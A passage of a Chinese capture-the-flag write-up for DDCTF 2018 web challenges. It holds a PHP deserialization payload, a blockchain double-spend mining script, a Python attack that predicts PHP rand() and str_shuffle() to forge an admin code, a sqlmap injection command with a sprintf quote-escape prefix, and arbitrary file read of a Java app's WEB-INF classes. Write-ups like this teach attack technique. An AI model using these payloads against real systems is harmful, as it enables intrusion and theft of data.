$this-&gt;sql-&gt;FlagGet($user)['flag'];<br style="margin: 0px; padding: 0px; max-width: 100%;">        `}`<br style="margin: 0px; padding: 0px; max-width: 100%;">    `}`<br style="margin: 0px; padding: 0px; max-width: 100%;">`}`<br style="margin: 0px; padding: 0px; max-width: 100%;">// Helper/SQL.php<br style="margin: 0px; padding: 0px; max-width: 100%;">class SQL<br style="margin: 0px; padding: 0px; max-width: 100%;">`{`<br style="margin: 0px; padding: 0px; max-width: 100%;">    public $dbc;<br style="margin: 0px; padding: 0px; max-width: 100%;">    public $pdo;<br style="margin: 0px; padding: 0px; max-width: 100%;">`}`<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

注意类的 **命名空间** 问题，如果构造的类为根路径，会导致类未初始化的错误。<br style="margin: 0px; padding: 0px; max-width: 100%;">我使用了 `namespace IndexHelper` 方式指定了全局命名空间。

序列化字符串构造 PHP 如下：

```
&lt;?php<br style="margin: 0px; padding: 0px; max-width: 100%;">/**<br style="margin: 0px; padding: 0px; max-width: 100%;"> * Created by PhpStorm.<br style="margin: 0px; padding: 0px; max-width: 100%;"> * User: Henryzhao<br style="margin: 0px; padding: 0px; max-width: 100%;"> * Date: 2018/4/14<br style="margin: 0px; padding: 0px; max-width: 100%;"> * Time: 20:34<br style="margin: 0px; padding: 0px; max-width: 100%;"> */<br style="margin: 0px; padding: 0px; max-width: 100%;">namespace IndexHelper;<br style="margin: 0px; padding: 0px; max-width: 100%;">class Test `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">    public $user_uuid;<br style="margin: 0px; padding: 0px; max-width: 100%;">    public $fl;<br style="margin: 0px; padding: 0px; max-width: 100%;">`}`<br style="margin: 0px; padding: 0px; max-width: 100%;">class Flag `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">    public $sql;<br style="margin: 0px; padding: 0px; max-width: 100%;">    public function __construct()<br style="margin: 0px; padding: 0px; max-width: 100%;">    `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">        $this-&gt;sql=new SQL();<br style="margin: 0px; padding: 0px; max-width: 100%;">    `}`<br style="margin: 0px; padding: 0px; max-width: 100%;">`}`<br style="margin: 0px; padding: 0px; max-width: 100%;">class SQL `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">    public $dbc;<br style="margin: 0px; padding: 0px; max-width: 100%;">    public $pdo;<br style="margin: 0px; padding: 0px; max-width: 100%;">`}`<br style="margin: 0px; padding: 0px; max-width: 100%;">class FLDbConnect `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">    protected $obj;<br style="margin: 0px; padding: 0px; max-width: 100%;">`}`<br style="margin: 0px; padding: 0px; max-width: 100%;">$a = new Test();<br style="margin: 0px; padding: 0px; max-width: 100%;">$a-&gt;user_uuid = '2a9597b9-954d-4cbb-a00b-687f6df00d54';<br style="margin: 0px; padding: 0px; max-width: 100%;">$a-&gt;fl = new Flag();<br style="margin: 0px; padding: 0px; max-width: 100%;">echo serialize($a).PHP_EOL;<br style="margin: 0px; padding: 0px; max-width: 100%;">echo urlencode(serialize($a));<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

获得如下序列化字符串之后，POST 至 `/justtry/try` 获得 flag。

> O:17:“IndexHelperTest”:2:`{`s:9:“user_uuid”;s:36:“2a9597b9-954d-4cbb-a00b-687f6df00d54”;s:2:“fl”;O:17:“IndexHelperFlag”:1:`{`s:3:“sql”;O:16:“IndexHelperSQL”:2:`{`s:3:“dbc”;N;s:3:“pdo”;N;`}``}``}`

### 0x04 Web 4 mini blockchain

题目：好题！<br style="margin: 0px; padding: 0px; max-width: 100%;">

解法：挖矿！<br style="margin: 0px; padding: 0px; max-width: 100%;">

根据题目描述：
<li style="margin: 0px; padding: 0px; max-width: 100%;">
“矿机也全部宕机”，当前算力为 0
</li>
<li style="margin: 0px; padding: 0px; max-width: 100%;">
“你能追回所有DDCoins”，需要追回
</li>
区块链特性：
<li style="margin: 0px; padding: 0px; max-width: 100%;">
只承认当前长度最长，工作量证明最大的一条链
</li>
<li style="margin: 0px; padding: 0px; max-width: 100%;">
设定难度为5，需要挖出 `hash` 开头为 5 个 `0` 的区块
</li>
流程：
<li style="margin: 0px; padding: 0px; max-width: 100%;">
从创世区块重新挖矿至区块高度最高
</li>
<li style="margin: 0px; padding: 0px; max-width: 100%;">
此时银行余额 10000
</li>
<li style="margin: 0px; padding: 0px; max-width: 100%;">
使用后门向商店转账
</li>
<li style="margin: 0px; padding: 0px; max-width: 100%;">
挖出一个新区块，确认获得钻石
</li>
<li style="margin: 0px; padding: 0px; max-width: 100%;">
从上一次银行余额为 10000 的区块开始，再次挖矿至区块高度最高
</li>
<li style="margin: 0px; padding: 0px; max-width: 100%;">
使用后门向商店转账
</li>
<li style="margin: 0px; padding: 0px; max-width: 100%;">
挖出一个新区块，确认获得钻石
</li>
<li style="margin: 0px; padding: 0px; max-width: 100%;">
访问 `/flag` 获得 flag
</li>
挖矿脚本如下：

```
#!/usr/bin/env python<br style="margin: 0px; padding: 0px; max-width: 100%;"># -*- encoding: utf-8 -*-<br style="margin: 0px; padding: 0px; max-width: 100%;">import hashlib, json<br style="margin: 0px; padding: 0px; max-width: 100%;">def hash(x):<br style="margin: 0px; padding: 0px; max-width: 100%;">    return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()<br style="margin: 0px; padding: 0px; max-width: 100%;">def hash_reducer(x, y):<br style="margin: 0px; padding: 0px; max-width: 100%;">    return hash(hash(x)+hash(y))<br style="margin: 0px; padding: 0px; max-width: 100%;">EMPTY_HASH = '0'*64<br style="margin: 0px; padding: 0px; max-width: 100%;">def hash_block(block):<br style="margin: 0px; padding: 0px; max-width: 100%;">    return reduce(hash_reducer, [block['prev'], block['nonce'], reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])<br style="margin: 0px; padding: 0px; max-width: 100%;">def create_block(prev_block_hash, nonce_str, transactions):<br style="margin: 0px; padding: 0px; max-width: 100%;">    if type(prev_block_hash) != type(''): raise Exception('prev_block_hash should be hex-encoded hash value')<br style="margin: 0px; padding: 0px; max-width: 100%;">    nonce = str(nonce_str)<br style="margin: 0px; padding: 0px; max-width: 100%;">    if len(nonce) &gt; 128: raise Exception('the nonce is too long')<br style="margin: 0px; padding: 0px; max-width: 100%;">    block = `{`'prev': prev_block_hash, 'nonce': nonce, 'transactions': transactions`}`<br style="margin: 0px; padding: 0px; max-width: 100%;">    block['hash'] = hash_block(block)<br style="margin: 0px; padding: 0px; max-width: 100%;">    return block<br style="margin: 0px; padding: 0px; max-width: 100%;">if __name__ == '__main__':<br style="margin: 0px; padding: 0px; max-width: 100%;">    # genesis_block_hash_web = 'bcb6c4b56055351b0bd3229a737581b412336eb9c2dd7e0ed9715584e2449609'<br style="margin: 0px; padding: 0px; max-width: 100%;">    try: <br style="margin: 0px; padding: 0px; max-width: 100%;">        while True:<br style="margin: 0px; padding: 0px; max-width: 100%;">            print "Difficulty: 5.nInput last block hash:",<br style="margin: 0px; padding: 0px; max-width: 100%;">            genesis_block_hash_web = raw_input()<br style="margin: 0px; padding: 0px; max-width: 100%;">            for i in range(0,10000000):<br style="margin: 0px; padding: 0px; max-width: 100%;">                my_block = create_block(genesis_block_hash_web,str(i),[])<br style="margin: 0px; padding: 0px; max-width: 100%;">                if my_block['hash'].startswith('00000'):<br style="margin: 0px; padding: 0px; max-width: 100%;">                    print json.dumps(my_block)<br style="margin: 0px; padding: 0px; max-width: 100%;">                    break<br style="margin: 0px; padding: 0px; max-width: 100%;">            #print json.dumps(my_block)<br style="margin: 0px; padding: 0px; max-width: 100%;">    except Exception, e:<br style="margin: 0px; padding: 0px; max-width: 100%;">        print str(e)<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

### 0x05 Web 5 我的博客

**rand 与 str_shuffle 预测**

根据题目提示下载 `www.tar.gz` 获得代码备份。<br style="margin: 0px; padding: 0px; max-width: 100%;">根据代码我们发现需要注册时的 `identity` 为 `admin` ，否则无法进行进一步操作，完成这个步骤需要预测 `$admin`。

PHP 中的 `str_shuffle()` 依赖 `rand()` 进行字符串随机操作，因此结合上文，可以预测生成的 `code` 字符串。<br style="margin: 0px; padding: 0px; max-width: 100%;">参考 PHP 5.6.35 string.c L5394 的 C 语言，实现 `str_shuffle()` 帮助解题。

PHP 5 中的 `rand()` 函数存在缺陷，可以通过 `rand[i] = rand[i-31] + rand[i-3]` 进行预测，网页中的 `csrf token` 直接暴露了完整的 `rand()` 结果，因此可以通过获得多次 `csrf` 来推测之后的结果。

```
// index.php<br style="margin: 0px; padding: 0px; max-width: 100%;">if (!$_SESSION['is_admin']) `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">    die('You are not admin. &lt;br&gt; Please &lt;a href="login.php"&gt;login&lt;/a&gt;!');<br style="margin: 0px; padding: 0px; max-width: 100%;">`}`<br style="margin: 0px; padding: 0px; max-width: 100%;">// login.php<br style="margin: 0px; padding: 0px; max-width: 100%;">$sth = $pdo-&gt;prepare('SELECT `identity` FROM users WHERE username = :username');<br style="margin: 0px; padding: 0px; max-width: 100%;">$sth-&gt;execute([':username' =&gt; $username]);<br style="margin: 0px; padding: 0px; max-width: 100%;">if ($sth-&gt;fetch()[0] === "admin") `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">    $_SESSION['is_admin'] = true;<br style="margin: 0px; padding: 0px; max-width: 100%;">`}` else `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">    $_SESSION['is_admin'] = false;<br style="margin: 0px; padding: 0px; max-width: 100%;">`}`<br style="margin: 0px; padding: 0px; max-width: 100%;">// register.php<br style="margin: 0px; padding: 0px; max-width: 100%;">if($_SERVER['REQUEST_METHOD'] === "POST")<br style="margin: 0px; padding: 0px; max-width: 100%;">`{`<br style="margin: 0px; padding: 0px; max-width: 100%;">    $admin = "admin###" . substr(str_shuffle('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 32);<br style="margin: 0px; padding: 0px; max-width: 100%;">    // ... ...<br style="margin: 0px; padding: 0px; max-width: 100%;">    $code = (isset($_POST['code']) === true) ? (string)$_POST['code'] : '';<br style="margin: 0px; padding: 0px; max-width: 100%;">    // ... ...<br style="margin: 0px; padding: 0px; max-width: 100%;">    if($code === $admin) `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">        $identity = "admin";<br style="margin: 0px; padding: 0px; max-width: 100%;">    `}` else `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">        $identity = "guest";<br style="margin: 0px; padding: 0px; max-width: 100%;">    `}`<br style="margin: 0px; padding: 0px; max-width: 100%;">    // ... ...<br style="margin: 0px; padding: 0px; max-width: 100%;">`}` else `{` <br style="margin: 0px; padding: 0px; max-width: 100%;">    // ... ...<br style="margin: 0px; padding: 0px; max-width: 100%;">    &lt;input type="hidden" name="csrf" id="csrf" value="&lt;?php $_SESSION['csrf'] = (string)rand();echo $_SESSION['csrf']; ?&gt;" required&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">    // ... ...<br style="margin: 0px; padding: 0px; max-width: 100%;">`}`<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

预测并注册代码如下：<br style="margin: 0px; padding: 0px; max-width: 100%;">`php_rand()`: 使用前述公式预测 `rand()` 结果<br style="margin: 0px; padding: 0px; max-width: 100%;">`php_str_shuffle()`: python 实现的 PHP `str_shuffle()` 函数。

```
import re<br style="margin: 0px; padding: 0px; max-width: 100%;">import time<br style="margin: 0px; padding: 0px; max-width: 100%;">import requests<br style="margin: 0px; padding: 0px; max-width: 100%;">REQ_NUM = 50<br style="margin: 0px; padding: 0px; max-width: 100%;">PHP_RAND_MAX = 0x7fffffff<br style="margin: 0px; padding: 0px; max-width: 100%;">DEBUG = False<br style="margin: 0px; padding: 0px; max-width: 100%;">rand_list = []<br style="margin: 0px; padding: 0px; max-width: 100%;">gen_rand_i = REQ_NUM<br style="margin: 0px; padding: 0px; max-width: 100%;">s = requests.Session()<br style="margin: 0px; padding: 0px; max-width: 100%;">url = 'http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/register.php'<br style="margin: 0px; padding: 0px; max-width: 100%;">def php_rand():<br style="margin: 0px; padding: 0px; max-width: 100%;">    global gen_rand_i<br style="margin: 0px; padding: 0px; max-width: 100%;">    rand_num = (rand_list[gen_rand_i-31]+rand_list[gen_rand_i-3]) &amp; PHP_RAND_MAX<br style="margin: 0px; padding: 0px; max-width: 100%;">    if DEBUG:<br style="margin: 0px; padding: 0px; max-width: 100%;">        print "Gen rand: " + str(gen_rand_i) + ": " + str(rand_num) + " = " + str(rand_list[gen_rand_i-31]) + " + " + str(rand_list[gen_rand_i-3])<br style="margin: 0px; padding: 0px; max-width: 100%;">    rand_list.append(rand_num)<br style="margin: 0px; padding: 0px; max-width: 100%;">    gen_rand_i += 1<br style="margin: 0px; padding: 0px; max-width: 100%;">    return rand_num<br style="margin: 0px; padding: 0px; max-width: 100%;"># define RAND_RANGE(__n, __min, __max, __tmax) <br style="margin: 0px; padding: 0px; max-width: 100%;">#    (__n) = (__min) + (long) ((double) ( (double) (__max) - (__min) + 1.0) * (__n / (__tmax + 1.0)))<br style="margin: 0px; padding: 0px; max-width: 100%;">def php_rand_range(rand_num, rmin, rmax, tmax):<br style="margin: 0px; padding: 0px; max-width: 100%;">    return int(rmin + (rmax - rmin + 1.0) * (rand_num / (tmax + 1.0)))<br style="margin: 0px; padding: 0px; max-width: 100%;"># https://github.com/php/php-src/blob/PHP-5.6.35/ext/standard/string.c#L5394<br style="margin: 0px; padding: 0px; max-width: 100%;">def php_str_shuffle(instr):<br style="margin: 0px; padding: 0px; max-width: 100%;">    str_len = len(instr)<br style="margin: 0px; padding: 0px; max-width: 100%;">    instr = list(instr)<br style="margin: 0px; padding: 0px; max-width: 100%;">    n_elems = str_len<br style="margin: 0px; padding: 0px; max-width: 100%;">    if n_elems &lt;= 1:<br style="margin: 0px; padding: 0px; max-width: 100%;">        return<br style="margin: 0px; padding: 0px; max-width: 100%;">    n_left = n_elems<br style="margin: 0px; padding: 0px; max-width: 100%;">    n_left -= 1<br style="margin: 0px; padding: 0px; max-width: 100%;">    while n_left &gt; 0:<br style="margin: 0px; padding: 0px; max-width: 100%;">        rnd_idx = php_rand()<br style="margin: 0px; padding: 0px; max-width: 100%;">        rnd_idx = php_rand_range(rnd_idx, 0, n_left, PHP_RAND_MAX)<br style="margin: 0px; padding: 0px; max-width: 100%;">        if rnd_idx != n_left:<br style="margin: 0px; padding: 0px; max-width: 100%;">            temp = instr[n_left]<br style="margin: 0px; padding: 0px; max-width: 100%;">            instr[n_left] = instr[rnd_idx]<br style="margin: 0px; padding: 0px; max-width: 100%;">            instr[rnd_idx] = temp<br style="margin: 0px; padding: 0px; max-width: 100%;">        n_left -= 1<br style="margin: 0px; padding: 0px; max-width: 100%;">    return ''.join(instr)<br style="margin: 0px; padding: 0px; max-width: 100%;">def get_rand_from_web():<br style="margin: 0px; padding: 0px; max-width: 100%;">    r = s.get(url)<br style="margin: 0px; padding: 0px; max-width: 100%;">    return int(re.findall('id="csrf" value="(.*)"',r.text)[0])<br style="margin: 0px; padding: 0px; max-width: 100%;">def prepare_rand():<br style="margin: 0px; padding: 0px; max-width: 100%;">    global gen_rand_i<br style="margin: 0px; padding: 0px; max-width: 100%;">    r = s.get(url)<br style="margin: 0px; padding: 0px; max-width: 100%;">    #print r.text<br style="margin: 0px; padding: 0px; max-width: 100%;">    for i in range(REQ_NUM):<br style="margin: 0px; padding: 0px; max-width: 100%;">        rand_list.append(get_rand_from_web())<br style="margin: 0px; padding: 0px; max-width: 100%;">def check_rand():<br style="margin: 0px; padding: 0px; max-width: 100%;">    for i in range(10):<br style="margin: 0px; padding: 0px; max-width: 100%;">        print str(php_rand()) + " &lt;-&gt; " + str(get_rand_from_web())<br style="margin: 0px; padding: 0px; max-width: 100%;">if __name__ == "__main__":<br style="margin: 0px; padding: 0px; max-width: 100%;">    prepare_rand()<br style="margin: 0px; padding: 0px; max-width: 100%;">    if DEBUG:<br style="margin: 0px; padding: 0px; max-width: 100%;">        check_rand()<br style="margin: 0px; padding: 0px; max-width: 100%;">        for i in range(len(rand_list)):<br style="margin: 0px; padding: 0px; max-width: 100%;">            print str(i) + ": " + str(rand_list[i])<br style="margin: 0px; padding: 0px; max-width: 100%;">        exit()<br style="margin: 0px; padding: 0px; max-width: 100%;">    auth = "admin###" + php_str_shuffle('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')[:32]<br style="margin: 0px; padding: 0px; max-width: 100%;">    data =  `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">        'csrf': str(rand_list[REQ_NUM - 1]),<br style="margin: 0px; padding: 0px; max-width: 100%;">        'username': 'hzfinally' + auth[18:20],<br style="margin: 0px; padding: 0px; max-width: 100%;">        'password': auth[10:18],<br style="margin: 0px; padding: 0px; max-width: 100%;">        'code': auth<br style="margin: 0px; padding: 0px; max-width: 100%;">    `}`<br style="margin: 0px; padding: 0px; max-width: 100%;">    r = s.post(url, data)<br style="margin: 0px; padding: 0px; max-width: 100%;">    print r.text + "n"<br style="margin: 0px; padding: 0px; max-width: 100%;">    print "Code: " + data['code']<br style="margin: 0px; padding: 0px; max-width: 100%;">    print "Username: " + data['username']<br style="margin: 0px; padding: 0px; max-width: 100%;">    print "Passrowd: " + data['password']<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

**多次 sprintf 导致单引号逃逸**

获得管理员权限之后，对查询入口进行注入，由于使用了两次 sprintf 可构造 payload 使 ‘ 逃逸。可参考这篇文章（https://paper.seebug.org/386/）。<br>
我们可以构造一个 `%1$'` 经过 `addslashes` 变为 `%1$'` 其中 `%1$` 为合法的格式化输出表达式，`sprintf`将会吃掉 `%1$` 使得单引号逃逸。

```
// index.php<br style="margin: 0px; padding: 0px; max-width: 100%;">if(isset($_GET['id']))`{`<br style="margin: 0px; padding: 0px; max-width: 100%;">    $id = addslashes($_GET['id']);<br style="margin: 0px; padding: 0px; max-width: 100%;">    if(isset($_GET['title']))`{`<br style="margin: 0px; padding: 0px; max-width: 100%;">        $title = addslashes($_GET['title']);<br style="margin: 0px; padding: 0px; max-width: 100%;">        $title = sprintf("AND title='%s'", $title);<br style="margin: 0px; padding: 0px; max-width: 100%;">    `}`else`{`<br style="margin: 0px; padding: 0px; max-width: 100%;">        $title = '';<br style="margin: 0px; padding: 0px; max-width: 100%;">    `}`<br style="margin: 0px; padding: 0px; max-width: 100%;">    $sql = sprintf("SELECT * FROM article WHERE id='%s' $title", $id);<br style="margin: 0px; padding: 0px; max-width: 100%;">    foreach ($pdo-&gt;query($sql) as $row) `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">        echo "&lt;h1&gt;".$row['title']."&lt;/h1&gt;&lt;br&gt;".$row['content'];<br style="margin: 0px; padding: 0px; max-width: 100%;">        die();<br style="margin: 0px; padding: 0px; max-width: 100%;">    `}`<br style="margin: 0px; padding: 0px; max-width: 100%;">`}`<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

最终构造注入指令如下：

```
sqlmap.py -u"http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/index.php?id=1&amp;title=Welcome!" --prefix="%1$'" --suffix=" -- -" -p title --cookie="PHPSESSID=77238cf069e52ba922d62ed27fc51179" --dump<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

在 key 表中读取 fl4g `DDCTF`{`9b7ccc1e96387b5ce079adab2fb08022`}``

### 0x06  Web 6 喝杯Java冷静下

**登录**

打开网页看到一个登录框，之后在注释中发现有一条 `base64` ，解码后为 `admin``:``admin_password_2333_caicaikan` 获得 admin 用户名密码。

```
86:        &lt;/div&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">87:        &lt;!-- YWRtaW46IGFkbWluX3Bhc3N3b3JkXzIzMzNfY2FpY2Fpa2Fu --&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">88:    &lt;/form&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01edce7a73e84ebeea.png)

登录后主页是四个下载链接 `rest/user/getInfomation?filename=informations/readme.txt`，想到任意文件读取。

[![](https://p4.ssl.qhimg.com/t0103198f605cdf749d.png)](https://p4.ssl.qhimg.com/t0103198f605cdf749d.png)

**任意文件读取**

搜索 `quick4j` 得知这是一个开源项目，获得源代码结构，使用 wget 一把梭，全拖下来。

```
wget -i filelist.txt --content-disposition --header "Cookie: JSESSIONID=0D8E262608F4C24C575F8F2138653409"<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

文件列表如下，已删除每行开头的 `http://116.85.48.104:5036/gd5Jq3XoKvGKqu5tIH2p/rest/user/getInfomation?filename=`

```
WEB-INF/classes/com/eliteams/quick4j/core/entity/DaoException.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/entity/ErrorResult.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/entity/JSONResult.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/entity/Result.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/entity/ServiceException.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/entity/UserException.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/feature/cache/redis/package-info.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/feature/cache/redis/RedisCache.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/feature/orm/dialect/Dialect.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/feature/orm/dialect/DialectFactory.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/feature/orm/dialect/MSDialect.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/feature/orm/dialect/MSPageHepler.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/feature/orm/dialect/MySql5Dialect.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/feature/orm/dialect/MySql5PageHepler.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/feature/orm/dialect/OracleDialect.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/feature/orm/dialect/PostgreDialect.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/feature/orm/dialect/PostgrePageHepler.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/feature/orm/mybatis/Page.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/feature/orm/mybatis/PaginationResultSetHandlerInterceptor.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/feature/orm/mybatis/PaginationStatementHandlerInterceptor.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/feature/orm/package-info.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/feature/package-info.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/feature/test/TestSupport.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/generic/GenericDao.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/generic/GenericEnum.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/generic/GenericService.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/generic/GenericServiceImpl.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/generic/package-info.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/util/ApplicationUtils.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/util/CookieUtils.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/core/util/PasswordHash.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/controller/CommonController.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/controller/FormController.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/controller/package-info.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/controller/PageController.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/controller/UserController.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/dao/PermissionMapper.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/dao/PermissionMapper.xml<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/dao/RoleMapper.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/dao/RoleMapper.xml<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/dao/UserMapper.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/dao/UserMapper.xml<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/enums/package-info.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/filter/package-info.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/interceptors/package-info.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/model/Permission.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/model/PermissionExample.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/model/Role.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/model/RoleExample.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/model/User.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/model/UserExample.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/security/OperationType.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/security/package-info.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/security/PermissionSign.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/security/Resource.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/security/RoleSign.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/security/SecurityRealm.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/service/impl/PermissionServiceImpl.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/service/impl/RoleServiceImpl.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/service/impl/UserServiceImpl.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/service/PermissionService.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/service/RoleService.class<br style="margin: 0px; padding: 0px; max-width: 100%;">WEB-INF/classes/com/eliteams/quick4j/web/service/UserService.class<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

**Super_admin**

审计代码后发现 `UserController.class` 下有 `/user/nicaicaikan_url_23333_secret` 路由，可以上传 XML ，但需要 super_admin 权限，怀疑 XXE。获得提示读取 `/flag/hint.txt`。

[![](https://p2.ssl.qhimg.com/t016e7e110e85adcdc6.png)](https://p2.ssl.qhimg.com/t016e7e110e85adcdc6.png)

继续审计发现，`security/SecurityRealm.class` 中，有一段代码提示了 super_admin 的密码。

[![](https://p2.ssl.qhimg.com/t0135e66eab3562c139.png)](https://p2.ssl.qhimg.com/t0135e66eab3562c139.png)

询问谷歌老师后获得 StackOverflow 老师的回答（[https://stackoverflow.com/questions/18746394/can-a-non-empty-string-have-a-hashcode-of-zero](https://stackoverflow.com/questions/18746394/can-a-non-empty-string-have-a-hashcode-of-zero)），得知 String `f5a5a608` 的 hashCode 为 0.

